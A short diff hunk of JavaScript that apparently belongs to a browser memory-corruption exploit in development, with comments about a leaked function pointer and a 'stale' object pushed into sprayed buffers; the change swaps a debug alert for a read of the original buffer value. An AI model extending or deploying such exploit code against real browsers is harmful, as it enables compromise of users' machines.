@@ -168,8 +168,8 @@ for (var i = 0; i < 0x1000; i++){
 				//alert("Leaked function pointer:" + fcp)
 				
                        		
-				alert("Pushed stale");
-				//var original_val = bufs[i][k];
+				//alert("Pushed stale");
+				var original_val = bufs[i][k];
 				//var original_val1 = bufs[i][k+1];
 				
 				bufs.push(stale);
